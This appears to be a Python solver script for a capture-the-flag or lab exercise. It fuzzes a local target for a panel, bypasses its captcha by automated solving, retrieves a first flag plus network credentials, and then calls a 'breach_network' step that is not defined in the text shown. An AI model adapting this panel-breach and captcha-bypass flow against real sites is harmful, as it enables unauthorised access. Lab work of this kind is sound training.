import argparse
import requests
import base64
import socket
from tp3.utils.config import logger
from tp3.utils.captcha import Captcha
from tp3.utils.fuzzer import fuzz

def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def breach_web(target: str) -> tuple[str, int, bytes]:
    sess = requests.Session()
    panel = fuzz(target)
    captcha_url = f"{target}/captcha.png"

    for _ in range(10):
        sess.get(panel, timeout=5)
        captcha = Captcha(sess, captcha_url)
        captcha.capture()
        captcha.solve()
        r = sess.post(panel, data={"captcha": captcha.get_value()}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(f"flag1: {data['flag1']}")
            return data["host"], data["port"], bytes.fromhex(data["key"])
    raise RuntimeError("captcha pa passé")




def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:8080")
    args = ap.parse_args()

    logger.info("Starting TP3 - breach the target")
    host, port, key = breach_web(args.target)
    flag = breach_network(host, port, key)
    logger.info(f"FLAG_FINAL: {flag}")


if __name__ == "__main__":
    main()
